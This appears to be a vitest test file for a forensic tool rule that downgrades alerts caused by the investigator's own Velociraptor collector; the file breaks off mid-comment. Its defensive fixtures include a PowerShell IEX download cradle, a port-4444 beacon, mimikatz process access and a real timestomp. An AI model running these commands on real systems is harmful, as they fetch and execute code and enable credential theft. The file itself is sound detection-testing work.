// The collector's own deployment on the case host is not evidence (#1460). INC-2026-028 finding f31
// (High, T1070.006) was built from three rows that describe the Companion's own Velociraptor client
// arriving: a download from the configured server, the msiexec install, and the Sysmon EID 2 the
// MSI leaves on the installed exe. Every rule here lowers a grade or strips a technique, so each one
// is a place an intruder would like to reach — the negative cases are the important half.
import { afterEach, describe, expect, it, vi } from "vitest";
import { mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  annotateCollectorDeployment,
  applyCollectorDeployment,
  configuredCollectorServers,
  isCollectorFootprint,
  isCollectorInstallBinary,
  isCollectorServerDestination,
  isCollectorSpawn,
  isLocalOrUnspecifiedHost,
  isMsiexecCreationTimeChange,
  loadCollectorInfrastructure,
} from "../../src/analysis/collectorDeployment.js";
import { aggregateEvents } from "../../src/analysis/eventAggregate.js";
import { parseHayabusaTimeline } from "../../src/analysis/hayabusaImport.js";
import { mapWindows, type MappedEvent } from "../../src/analysis/siemImport.js";

const SERVER = "10.20.30.40";
const INSTALL_EXE = "C:\\Program Files\\Velociraptor\\Velociraptor.exe";
const MSIEXEC = "C:\\Windows\\System32\\msiexec.exe";

function ev(over: Partial<MappedEvent>): MappedEvent {
  return {
    timestamp: "2026-03-01T11:29:52Z",
    description: "",
    severity: "Medium",
    mitre: [],
    aggKey: "k",
    sources: ["Sysmon"],
    ...over,
  };
}

// The three f31 rows, in the shape mapWindows renders them.
const download = () =>
  ev({
    description: `Sysmon Network connection (EID 3) - Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe - DestinationIp=${SERVER} - DestinationPort=8000 @ WS01`,
    severity: "High",
    mitre: ["T1105"],
    aggKey: "download",
    dstIp: SERVER,
    port: 8000,
  });
const install = () =>
  ev({
    description: `Sysmon Process created (EID 1) - Image=${MSIEXEC} - CommandLine=/i C:\\Users\\it\\Downloads\\velociraptor-0.72.msi /qn @ WS01`,
    severity: "Medium",
    mitre: ["T1218.007"],
    aggKey: "install",
    processName: "msiexec.exe",
    commandLine: `"${MSIEXEC}" /i C:\\Users\\it\\Downloads\\velociraptor-0.72.msi /qn`,
  });
const timeChange = () =>
  ev({
    description: `Sysmon File creation time changed (timestomp) (EID 2) - Image=${MSIEXEC} - TargetFilename=${INSTALL_EXE} @ WS01`,
    severity: "Medium",
    mitre: ["T1070.006"],
    aggKey: "time-change",
    path: INSTALL_EXE,
  });

// A Velociraptor api_client.yaml naming this api_connection_string, in a temp dir.
function apiConfig(connection: string): string {
  const file = join(mkdtempSync(join(tmpdir(), "velo-api-")), "api_client.yaml");
  writeFileSync(
    file,
    `ca_certificate: |\n  -----BEGIN-----\napi_connection_string: ${connection}\nname: api\n`,
  );
  return file;
}

// One Hayabusa csv-timeline row through the REAL importer (#1471), back in the MappedEvent shape the
// rules read. Hayabusa renders its own key names joined by one space after an em dash and cuts each
// value at 120 characters — a hand-written ` - Image=` description would test a shape it never
// produces. The importer's aggregation seam already ran the overlay once with the env's configuration;
// every rule is idempotent, so the explicit call a test makes on top sees the same row.
interface HayabusaRow {
  eid: string;
  channel: string;
  title: string;
  details: string; // the Details cell, " ¦ "-separated `Key: value` pairs
  level?: string;
  mitre?: string;
}
function hayabusa(row: HayabusaRow): MappedEvent {
  const esc = (v: string): string => `"${v.replace(/"/g, '""')}"`;
  const header = "Timestamp,Computer,Channel,EventID,Level,RuleTitle,Details,MitreTags,RecordID";
  const line = [
    "2026-03-01 11:29:52.000 +00:00",
    "WS01",
    row.channel,
    row.eid,
    row.level ?? "high",
    row.title,
    row.details,
    row.mitre ?? "",
    "77",
  ]
    .map(esc)
    .join(",");
  const { events } = parseHayabusaTimeline(`${header}\n${line}`);
  expect(events).toHaveLength(1);
  const e = events[0];
  return { ...e, mitre: e.mitreTechniques, aggKey: e.description };
}

afterEach(() => vi.unstubAllEnvs());

describe("configuredCollectorServers — known infrastructure comes from config only", () => {
  it("reads the GUI URL's host", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", "");
    expect(configuredCollectorServers()).toEqual([SERVER]);
  });

  it("reads api_connection_string from the api_client config when the file exists", () => {
    const dir = mkdtempSync(join(tmpdir(), "velo-api-"));
    const file = join(dir, "api_client.yaml");
    writeFileSync(
      file,
      `ca_certificate: |\n  -----BEGIN-----\napi_connection_string: https://velo.example.com:8001\nname: api\n`,
    );
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", "");
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", file);
    expect(configuredCollectorServers()).toEqual(["velo.example.com"]);
  });

  it("is empty with nothing configured, and a missing config file is not an error", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", "");
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", join(tmpdir(), "does-not-exist", "api.yaml"));
    expect(configuredCollectorServers()).toEqual([]);
  });

  it("lower-cases and de-duplicates a host named by both sources", () => {
    const dir = mkdtempSync(join(tmpdir(), "velo-api-"));
    const file = join(dir, "api_client.yaml");
    writeFileSync(file, `api_connection_string: https://VELO:8001\n`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", "https://velo:8889");
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", file);
    expect(configuredCollectorServers()).toEqual(["velo"]);
  });

  // #1471 finding 1: Velociraptor writes `api_connection_string: 127.0.0.1:8001` by default and the
  // GUI URL is often https://localhost:8889 when the Companion runs on the server. From a client's
  // point of view loopback is itself, never the server, so it must not become known infrastructure.
  it("drops the loopback pair the default server-side setup produces, leaving rule 1 inert", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", "https://localhost:8889");
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", apiConfig("127.0.0.1:8001"));
    expect(configuredCollectorServers()).toEqual([]);
  });

  it("keeps a real address configured next to a loopback one", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", apiConfig("127.0.0.1:8001"));
    expect(configuredCollectorServers()).toEqual([SERVER]);
  });

  // Each spelling goes through `new URL`, which canonicalises some of them (`127.1` → 127.0.0.1,
  // `[0:0:0:0:0:0:0:1]` → ::1, `[::ffff:127.0.0.1]` → ::ffff:7f00:1).
  it.each([
    "localhost",
    "localhost.",
    "LOCALHOST",
    "127.0.0.1",
    "127.1",
    "127.255.0.9",
    "[::1]",
    "[0:0:0:0:0:0:0:1]",
    "0.0.0.0",
    "[::]",
    "[::ffff:127.0.0.1]",
    "[::ffff:7f00:1]",
    "[::ffff:127.0.0.2]",
    "[::ffff:127.1.2.3]",
    "[::ffff:7f01:203]",
  ])("yields nothing for the loopback / unspecified spelling %s, from either source", (host) => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${host}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", apiConfig(`${host}:8001`));
    expect(configuredCollectorServers()).toEqual([]);
  });

  it("isLocalOrUnspecifiedHost reads the raw spellings too, and nothing routable", () => {
    for (const h of [
      "::ffff:127.0.0.1",
      "::ffff:7f00:1",
      "::ffff:7f01:203",
      "::1",
      "::",
      "127.0.0.1",
      "localhost.",
    ])
      expect(isLocalOrUnspecifiedHost(h), h).toBe(true);
    for (const h of [
      "10.20.30.40",
      "128.0.0.1",
      "1270.0.0.1",
      "::ffff:8000:1",
      "localhost.example.com",
      "velo",
      "",
    ])
      expect(isLocalOrUnspecifiedHost(h), h).toBe(false);
  });
});

describe("isCollectorServerDestination — only a destination or URL field may name the server", () => {
  const infra = { servers: new Set([SERVER]) };

  it("matches DestinationIp / DestinationHostname / the structured dstIp", () => {
    expect(isCollectorServerDestination(download(), infra)).toBe(true);
    expect(
      isCollectorServerDestination(
        ev({
          description: `Sysmon Network connection (EID 3) - Image=x.exe - DestinationHostname=${SERVER}`,
        }),
        infra,
      ),
    ).toBe(true);
    expect(isCollectorServerDestination(ev({ description: "no fields", dstIp: SERVER }), infra)).toBe(true);
  });

  it("matches the host of a URL in the command line", () => {
    expect(
      isCollectorServerDestination(
        ev({
          description: `Sysmon Process created (EID 1) - Image=C:\\W\\powershell.exe - CommandLine=iwr http://${SERVER}:8000/velociraptor.exe -OutFile v.exe`,
        }),
        infra,
      ),
    ).toBe(true);
  });

  it("does NOT match the address as free text", () => {
    expect(
      isCollectorServerDestination(
        ev({
          description: `Sysmon Process created (EID 1) - Image=x.exe - CommandLine=echo ${SERVER} > note.txt`,
        }),
        infra,
      ),
    ).toBe(false);
    expect(isCollectorServerDestination(ev({ description: `SIEM event: ping from ${SERVER}` }), infra)).toBe(
      false,
    );
  });

  it("does NOT match a different host, or a host that merely contains the server", () => {
    expect(isCollectorServerDestination(ev({ description: "x - DestinationIp=10.20.30.41" }), infra)).toBe(
      false,
    );
    expect(isCollectorServerDestination(ev({ description: "x - DestinationIp=110.20.30.40" }), infra)).toBe(
      false,
    );
  });

  it("is inert with no server configured", () => {
    expect(isCollectorServerDestination(download(), { servers: new Set() })).toBe(false);
  });
});

describe("isCollectorInstallBinary — the install root, never a bare name", () => {
  it("matches msiexec installing a velociraptor MSI", () => {
    expect(isCollectorInstallBinary(install())).toBe(true);
  });

  it("matches the collector exe under its install root", () => {
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Sysmon Process created (EID 1) - Image=${INSTALL_EXE} - CommandLine=service run`,
          processName: "Velociraptor.exe",
        }),
      ),
    ).toBe(true);
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Sysmon Process created (EID 1) - Image=C:\\Program Files (x86)\\Velociraptor\\velociraptor.exe`,
        }),
      ),
    ).toBe(true);
  });

  it("matches the service registration (7045) whose ImagePath is the collector exe, quoted or bare", () => {
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Windows System Service installed (EID 7045) - ServiceName=Velociraptor Service - ImagePath="${INSTALL_EXE}" --config "C:\\Program Files\\Velociraptor\\client.config.yaml" service run - StartType=auto start @ WS01`,
        }),
      ),
    ).toBe(true);
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Windows System Service installed (EID 7045) - ServiceName=Velociraptor - ImagePath=${INSTALL_EXE}`,
        }),
      ),
    ).toBe(true);
  });

  it("does NOT match a 7045 whose ImagePath is outside the root, whatever the service is called", () => {
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Windows System Service installed (EID 7045) - ServiceName=Velociraptor Service - ImagePath="C:\\Users\\Public\\Velociraptor.exe" service run`,
        }),
      ),
    ).toBe(false);
  });

  it("does NOT match velociraptor.exe outside the install root", () => {
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Sysmon Process created (EID 1) - Image=C:\\Users\\Public\\velociraptor.exe - CommandLine=velociraptor.exe -c evil.yaml`,
        }),
      ),
    ).toBe(false);
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Sysmon Process created (EID 1) - Image=C:\\Users\\v\\Velociraptor\\velociraptor.exe`,
        }),
      ),
    ).toBe(false);
  });

  // #1471 finding 3: the doc said "the system msiexec.exe" but the code matched the bare name, so a
  // copy an intruder dropped in Public installing its own velociraptor.msi was graded as the install.
  it("does NOT match an msiexec.exe outside \\Windows\\ installing a velociraptor MSI", () => {
    const row = ev({
      description: `Sysmon Process created (EID 1) - Image=C:\\Users\\Public\\msiexec.exe - CommandLine=/i C:\\Users\\Public\\velociraptor.msi @ WS01`,
      severity: "High",
      mitre: ["T1218.007"],
      processName: "msiexec.exe",
      commandLine: `C:\\Users\\Public\\msiexec.exe /i C:\\Users\\Public\\velociraptor.msi`,
    });
    expect(isCollectorInstallBinary(row)).toBe(false);
    annotateCollectorDeployment(row, { servers: new Set([SERVER]) });
    expect(row.severity).toBe("High");
    expect(row.mitre).toEqual(["T1218.007"]);
    expect(row.description).not.toMatch(/DFIR collector/);
  });

  it("does NOT match a non-process row, or msiexec with another MSI, or a traversal path", () => {
    expect(isCollectorInstallBinary(timeChange())).toBe(false);
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Sysmon Process created (EID 1) - Image=${MSIEXEC} - CommandLine=/i C:\\tmp\\other.msi /qn`,
        }),
      ),
    ).toBe(false);
    expect(
      isCollectorInstallBinary(
        ev({
          description: `Sysmon Process created (EID 1) - Image=C:\\Program Files\\Velociraptor\\..\\..\\Users\\v\\velociraptor.exe`,
        }),
      ),
    ).toBe(false);
  });
});

const THOR = "C:\\Program Files\\Velociraptor\\Tools\\tmp1845340523\\thor64-lite.exe";
const LSASS = "C:\\Windows\\System32\\lsass.exe";
// The real-collection shape: THOR, unpacked and run by the client, opening lsass (Sysmon EID 10).
const thorAccess = () =>
  ev({
    description: `Sysmon Process accessed (EID 10) - SourceImage=${THOR} - TargetImage=${LSASS} - GrantedAccess=0x1010 @ DESKTOP-16OJFO6`,
    severity: "High",
    mitre: ["T1003.001"],
    aggKey: "thor-lsass",
    processName: "thor64-lite.exe",
  });

describe("isCollectorFootprint — a tool the client ran out of its install root", () => {
  it("matches THOR opening lsass from the unpacked tool tree (EID 10, SourceImage)", () => {
    expect(isCollectorFootprint(thorAccess())).toBe(true);
  });

  it.each([
    ["EID 1", `Sysmon Process created (EID 1) - Image=${THOR} - CommandLine=thor64-lite.exe --quick`],
    [
      "EID 3",
      `Sysmon Network connection (EID 3) - Image=${THOR} - DestinationIp=203.0.113.9 - DestinationPort=443`,
    ],
    ["EID 11", `Sysmon File created (EID 11) - Image=${THOR} - TargetFilename=C:\\ProgramData\\thor.log`],
    [
      "EID 22",
      `Sysmon DNS query (EID 22) - Image=${INSTALL_EXE} - QueryName=velo.example.com - QueryResults=10.20.30.40`,
    ],
    [
      "4688",
      `Security Process created (EID 4688) - NewProcessName=C:\\Program Files (x86)\\Velociraptor\\Tools\\tmp1\\hayabusa.exe`,
    ],
  ])("matches a %s row whose acting image is under the root", (_label, description) => {
    expect(isCollectorFootprint(ev({ description }))).toBe(true);
  });

  it("the client exe's own process-create takes the install note, not the footprint note", () => {
    const row = ev({
      description: `Sysmon Process created (EID 1) - Image=${INSTALL_EXE} - CommandLine=service run`,
      processName: "Velociraptor.exe",
    });
    applyCollectorDeployment([row]);
    expect(row.severity).toBe("Info");
    expect(row.description).toMatch(/Velociraptor client install\]$/);
    expect(row.description).not.toMatch(/footprint/);
  });

  it("does NOT match the same tool outside the root, or a \\Velociraptor\\ directory elsewhere", () => {
    expect(
      isCollectorFootprint(
        ev({
          description: `Sysmon Process accessed (EID 10) - SourceImage=C:\\Users\\Public\\thor64-lite.exe - TargetImage=${LSASS}`,
        }),
      ),
    ).toBe(false);
    expect(
      isCollectorFootprint(
        ev({
          description: `Sysmon Process accessed (EID 10) - SourceImage=C:\\Users\\v\\Velociraptor\\Tools\\thor64-lite.exe - TargetImage=${LSASS}`,
        }),
      ),
    ).toBe(false);
    expect(
      isCollectorFootprint(
        ev({
          description: `Sysmon Process accessed (EID 10) - SourceImage=C:\\Program Files\\Velociraptor\\..\\..\\Users\\v\\thor64-lite.exe - TargetImage=${LSASS}`,
        }),
      ),
    ).toBe(false);
  });

  it("never reads TargetImage — an intruder opening the collector is not the collector", () => {
    expect(
      isCollectorFootprint(
        ev({
          description: `Sysmon Process accessed (EID 10) - SourceImage=C:\\Users\\Public\\mimikatz.exe - TargetImage=${INSTALL_EXE} - GrantedAccess=0x1fffff`,
        }),
      ),
    ).toBe(false);
  });

  it("does NOT match a non-process-shaped row naming the root", () => {
    expect(
      isCollectorFootprint(
        ev({ description: `Sysmon Registry value set (EID 13) - Image=${THOR} - TargetObject=HKLM\\x` }),
      ),
    ).toBe(false);
  });
});

describe("isMsiexecCreationTimeChange — Sysmon EID 2 written by the system msiexec.exe", () => {
  it("matches the f31 row", () => {
    expect(isMsiexecCreationTimeChange(timeChange())).toBe(true);
  });

  it("matches the SysWOW64 msiexec and Hayabusa's real EID rendering (Proc=, one-space joins)", () => {
    const row = hayabusa({
      eid: "2",
      channel: "Microsoft-Windows-Sysmon/Operational",
      title: "File Creation Time Changed",
      details: "Proc: C:\\Windows\\SysWOW64\\msiexec.exe ¦ TgtFile: C:\\x.exe",
    });
    // The rendering the reader is built for — and the note the importer's own seam already appended.
    expect(row.description).toMatch(
      /^Hayabusa: File Creation Time Changed \(EID 2 Microsoft-Windows-Sysmon\/Operational\) — Proc=C:\\Windows\\SysWOW64\\msiexec\.exe TgtFile=C:\\x\.exe @ WS01 \[MSI install artifact/,
    );
    expect(isMsiexecCreationTimeChange(row)).toBe(true);
  });

  it("does NOT match a timestomp from another process, or an msiexec outside System32, or another EID", () => {
    expect(
      isMsiexecCreationTimeChange(
        ev({
          description: `Sysmon File creation time changed (timestomp) (EID 2) - Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe - TargetFilename=C:\\Users\\Public\\svchost.exe`,
        }),
      ),
    ).toBe(false);
    expect(
      isMsiexecCreationTimeChange(
        ev({
          description: `Sysmon File creation time changed (timestomp) (EID 2) - Image=C:\\Users\\Public\\msiexec.exe - TargetFilename=C:\\x.exe`,
        }),
      ),
    ).toBe(false);
    expect(
      isMsiexecCreationTimeChange(
        ev({ description: `Sysmon Process created (EID 1) - Image=${MSIEXEC} - CommandLine=/i x.msi` }),
      ),
    ).toBe(false);
    expect(
      isMsiexecCreationTimeChange(
        ev({ description: `Sysmon Network connection (EID 22) - Image=${MSIEXEC} - DestinationIp=1.2.3.4` }),
      ),
    ).toBe(false);
  });
});

describe("applyCollectorDeployment — the f31 sequence", () => {
  it("grades the download and the install Info, and strips T1070.006 from the msiexec EID 2", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", "");
    const rows = [download(), install(), timeChange()];
    applyCollectorDeployment(rows);

    expect(rows[0].severity).toBe("Info");
    expect(rows[0].description).toMatch(
      / \[DFIR collector deployment — download from the configured Velociraptor server\]$/,
    );
    expect(rows[1].severity).toBe("Info");
    expect(rows[1].description).toMatch(/ \[DFIR collector deployment — Velociraptor client install\]$/);
    // The EID 2 keeps its grade and its row; only the timestomp claim goes.
    expect(rows[2].severity).toBe("Medium");
    expect(rows[2].mitre).not.toContain("T1070.006");
    expect(rows[2].description).toMatch(
      / \[MSI install artifact — creation-time change by msiexec.exe is not timestomping\]$/,
    );
  });

  it("grades THOR's lsass access Info with the footprint note, and leaves the tool in Public alone", () => {
    const rows = [
      thorAccess(),
      ev({
        description: `Sysmon Process accessed (EID 10) - SourceImage=C:\\Users\\Public\\thor64-lite.exe - TargetImage=${LSASS}`,
        severity: "High",
        aggKey: "public-thor",
      }),
    ];
    applyCollectorDeployment(rows);
    expect(rows[0].severity).toBe("Info");
    expect(rows[0].description).toMatch(
      / \[DFIR collector footprint — tool run by the Velociraptor client\]$/,
    );
    expect(rows[1].severity).toBe("High");
    expect(rows[1].description).not.toMatch(/DFIR collector/);
  });

  it("leaves a real timestomp and a masquerading velociraptor.exe alone", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    const stomp = ev({
      description: `Sysmon File creation time changed (timestomp) (EID 2) - Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe - TargetFilename=C:\\Users\\Public\\svchost.exe`,
      mitre: ["T1070.006"],
    });
    const masq = ev({
      description: `Sysmon Process created (EID 1) - Image=C:\\Users\\Public\\velociraptor.exe - CommandLine=velociraptor.exe -c evil.yaml`,
      severity: "High",
      mitre: ["T1036.005"],
    });
    const before = [structuredClone(stomp), structuredClone(masq)];
    applyCollectorDeployment([stomp, masq]);
    expect([stomp, masq]).toEqual(before);
  });

  // #1471 finding 1: with the server configured as loopback, a High 4104 cradle staged from
  // http://127.0.0.1:8080 and a Medium EID 3 from %TEMP% to 127.0.0.1:4444 came out Info with the
  // download note — on every host, since every host is its own loopback.
  it("a loopback server configuration demotes nothing: local staging keeps its grade", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", "https://localhost:8889");
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", apiConfig("127.0.0.1:8001"));
    const cradle = ev({
      description: `PowerShell Script block (EID 4104) - ScriptBlockText=IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:8080/stage.ps1') @ WS01`,
      severity: "High",
      mitre: ["T1059.001", "T1105"],
      aggKey: "cradle",
    });
    const beacon = ev({
      description: `Sysmon Network connection (EID 3) - Image=C:\\Users\\a\\AppData\\Local\\Temp\\x.exe - DestinationIp=127.0.0.1 - DestinationPort=4444 @ WS01`,
      severity: "Medium",
      mitre: ["T1571"],
      aggKey: "beacon",
      dstIp: "127.0.0.1",
      port: 4444,
    });
    const before = [structuredClone(cradle), structuredClone(beacon)];
    const infra = loadCollectorInfrastructure();
    expect(infra.servers.size).toBe(0);
    annotateCollectorDeployment(cradle, infra);
    annotateCollectorDeployment(beacon, infra);
    expect([cradle, beacon]).toEqual(before);
  });

  it("with no server configured, the download keeps its grade and the other two rules still run", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", "");
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", "");
    const rows = [download(), install(), timeChange()];
    applyCollectorDeployment(rows);
    expect(rows[0].severity).toBe("High");
    expect(rows[0].description).not.toMatch(/DFIR collector deployment/);
    expect(rows[1].severity).toBe("Info");
    expect(rows[2].mitre).toEqual([]);
  });

  it("strips T1070.006 but keeps the row's other techniques, and annotates once", () => {
    const row = ev({
      description: timeChange().description,
      mitre: ["T1070.006", "T1036"],
    });
    const infra = loadCollectorInfrastructure();
    annotateCollectorDeployment(row, infra);
    annotateCollectorDeployment(row, infra);
    expect(row.mitre).toEqual(["T1036"]);
    expect(row.description.match(/MSI install artifact/g)).toHaveLength(1);
  });
});

describe("aggregateEvents runs the collector-deployment overlay", () => {
  it("emits the f31 download as Info with the deployment note", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", "");
    const { events } = aggregateEvents([download(), timeChange()]);
    const dl = events.find((e) => /DestinationIp=/.test(e.description))!;
    expect(dl.severity).toBe("Info");
    expect(dl.description).toMatch(
      /\[DFIR collector deployment — download from the configured Velociraptor server\]/,
    );
    const tc = events.find((e) => /\(EID 2\)/.test(e.description))!;
    expect(tc.mitreTechniques).toEqual([]);
    expect(tc.description).toMatch(/MSI install artifact/);
  });

  it("a demoted row falls under a severity floor, so the floor sees the collector grade", () => {
    vi.stubEnv("DFIR_VELOCIRAPTOR_GUI_URL", `https://${SERVER}:8889`);
    vi.stubEnv("DFIR_VELOCIRAPTOR_API_CONFIG", "");
    const { events } = aggregateEvents([download()], { minSeverity: "Low" });
    expect(events).toHaveLength(0);
  });
});

// #1471 finding 5: the rules read Hayabusa's OWN rendering — `Proc=`, `Cmdline=`, `SrcProc=`,
// `TgtIP=`, `Path=` joined by one space — through the real importer, never a hand-written ` - Image=`
// description Hayabusa does not produce. Rules 1 and 2 read the structured commandLine / dstIp the
// importer now carries, so the 120-character cut on the rendered subject cannot hide the MSI name or
// the destination.
describe("Hayabusa rows — the rules read Hayabusa's rendering", () => {
  const SYSMON = "Microsoft-Windows-Sysmon/Operational";
  const infra = { servers: new Set([SERVER]) };

  it("rule 3: EID 2 by the system msiexec loses T1070.006 and gains the MSI note, at its grade", () => {
    const row = hayabusa({
      eid: "2",
      channel: SYSMON,
      title: "File Creation Time Changed",
      level: "medium",
      details: `Proc: ${MSIEXEC} ¦ TgtFile: ${INSTALL_EXE} ¦ PrevTime: 2026-01-01 ¦ NewTime: 2026-02-02 ¦ PID: 12`,
      mitre: "t1070.006",
    });
    expect(isMsiexecCreationTimeChange(row)).toBe(true);
    // The importer's own aggregation seam already applied the rule to the real row.
    expect(row.mitre).toEqual([]);
    expect(row.severity).toBe("Medium");
    expect(row.description).toMatch(/creation-time change by msiexec.exe is not timestomping\]$/);
  });

  it("rule 2: EID 1 system msiexec + velociraptor MSI → Info with the install note, even when the MSI name sits past the 120-char cut", () => {
    const msi = `C:\\Users\\it\\Downloads\\${"deep\\".repeat(30)}velociraptor-0.72.msi`;
    const row = hayabusa({
      eid: "1",
      channel: SYSMON,
      title: "Msiexec Install",
      level: "medium",
      details: `Cmdline: ${MSIEXEC} /i ${msi} /qn ¦ Proc: ${MSIEXEC} ¦ User: SYSTEM ¦ ParentCmdline: x ¦ LID: 1 ¦ PID: 2`,
      mitre: "t1218.007",
    });
    expect(row.description).not.toContain("velociraptor-0.72.msi"); // cut from the subject
    expect(row.commandLine).toContain("velociraptor-0.72.msi"); // whole in the structured field
    expect(isCollectorInstallBinary(row)).toBe(true);
    annotateCollectorDeployment(row, infra);
    expect(row.severity).toBe("Info");
    expect(row.description).toMatch(/ \[DFIR collector deployment — Velociraptor client install\]$/);
  });

  it("rule 1: EID 3 with TgtIP=<server> → Info with the download note", () => {
    const row = hayabusa({
      eid: "3",
      channel: SYSMON,
      title: "Net conn",
      details: `Proc: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe ¦ Proto: tcp ¦ SrcIP: 10.0.0.5 ¦ SrcPort: 5000 ¦ TgtIP: ${SERVER} ¦ TgtPort: 8000`,
      mitre: "t1105",
    });
    expect(row.dstIp).toBe(SERVER);
    expect(isCollectorServerDestination(row, infra)).toBe(true);
    annotateCollectorDeployment(row, infra);
    expect(row.severity).toBe("Info");
    expect(row.description).toMatch(/download from the configured Velociraptor server\]$/);
  });

  it("rule 1: the rendered TgtIP field alone matches, with no structured dstIp", () => {
    const row = hayabusa({
      eid: "3",
      channel: SYSMON,
      title: "Net conn",
      details: `Proc: C:\\x.exe ¦ TgtIP: ${SERVER} ¦ TgtPort: 8000`,
    });
    delete row.dstIp;
    expect(isCollectorServerDestination(row, infra)).toBe(true);
  });

  it("rule 1 via the JSON timeline, fields reordered and under the DstIP alias", () => {
    const { events } = parseHayabusaTimeline(
      JSON.stringify({
        Timestamp: "2026-03-01 11:29:52.000 +00:00",
        Computer: "WS01",
        Channel: SYSMON,
        EventID: 3,
        Level: "high",
        RuleTitle: "Net conn",
        Details: { DstIP: SERVER, DstPort: 8000, Proc: "C:\\x.exe" },
      }),
    );
    const row: MappedEvent = { ...events[0], mitre: events[0].mitreTechniques, aggKey: "k" };
    expect(isCollectorServerDestination(row, infra)).toBe(true);
    delete row.dstIp;
    expect(isCollectorServerDestination(row, infra)).toBe(true);
  });

  it('rule 2: 7045 with Path="<install exe>" service run is the service registration', () => {
    const row = hayabusa({
      eid: "7045",
      channel: "Sys",
      title: "Svc install",
      level: "medium",
      details: `Svc: Velociraptor ¦ Path: "${INSTALL_EXE}" service run ¦ SvcType: user mode ¦ StartType: auto`,
    });
    expect(isCollectorInstallBinary(row)).toBe(true);
    expect(row.severity).toBe("Info");
    expect(row.description).toMatch(/Velociraptor client install\]$/);
  });

  it("rule 2b: EID 10 with SrcProc=<THOR under the install root> is the collector's footprint", () => {
    const row = hayabusa({
      eid: "10",
      channel: SYSMON,
      title: "LSASS Access",
      details: `SrcProc: ${THOR} ¦ TgtProc: ${LSASS} ¦ GrantedAccess: 0x1010 ¦ CallTrace: x`,
      mitre: "t1003.001",
    });
    expect(isCollectorFootprint(row)).toBe(true);
    expect(row.severity).toBe("Info");
    expect(row.description).toMatch(/tool run by the Velociraptor client\]$/);
  });

  it("NEGATIVE: Proc=C:\\Users\\Public\\msiexec.exe misses rules 2 and 3", () => {
    const install = hayabusa({
      eid: "1",
      channel: SYSMON,
      title: "Msiexec Install",
      details: `Cmdline: C:\\Users\\Public\\msiexec.exe /i C:\\Users\\Public\\velociraptor.msi ¦ Proc: C:\\Users\\Public\\msiexec.exe`,
      mitre: "t1218.007",
    });
    expect(isCollectorInstallBinary(install)).toBe(false);
    annotateCollectorDeployment(install, infra);
    expect(install.severity).toBe("High");
    expect(install.mitre).toEqual(["T1218.007"]);
    const stomp = hayabusa({
      eid: "2",
      channel: SYSMON,
      title: "File Creation Time Changed",
      details: `Proc: C:\\Users\\Public\\msiexec.exe ¦ TgtFile: C:\\x.exe`,
      mitre: "t1070.006",
    });
    expect(isMsiexecCreationTimeChange(stomp)).toBe(false);
    expect(stomp.mitre).toEqual(["T1070.006"]);
  });

  it("NEGATIVE: the server address as free text in a Cmdline is not a destination", () => {
    const row = hayabusa({
      eid: "1",
      channel: SYSMON,
      title: "Suspicious Echo",
      details: `Cmdline: cmd.exe /c echo ${SERVER} > note.txt ¦ Proc: C:\\Windows\\System32\\cmd.exe`,
    });
    expect(row.description).toContain(SERVER);
    expect(isCollectorServerDestination(row, infra)).toBe(false);
    annotateCollectorDeployment(row, infra);
    expect(row.severity).toBe("High");
    expect(row.description).not.toMatch(/DFIR collector/);
  });

  it("NEGATIVE: ParentProc= is not Proc=, so a parent under the root does not make the child the collector", () => {
    const row = hayabusa({
      eid: "1",
      channel: SYSMON,
      title: "Proc create",
      details: `Cmdline: evil.exe ¦ Proc: C:\\Users\\Public\\evil.exe ¦ ParentProc: ${INSTALL_EXE}`,
    });
    expect(isCollectorFootprint(row)).toBe(false);
    expect(isCollectorInstallBinary(row)).toBe(false);
    expect(row.severity).toBe("High");
  });
});

// #1477: the process the collector ITSELF spawned. Windows.Forensics.PersistenceSniper makes the
// Velociraptor client start the SYSTEM powershell.exe with `import-module "<install root>\Tools\
// tmp…\PersistenceSniper\PersistenceSniper.psm1"`. The acting image is System32\powershell.exe, so
// rule 2b (acting image under the root) never fires, and the Sigma "Change PowerShell Policies" /
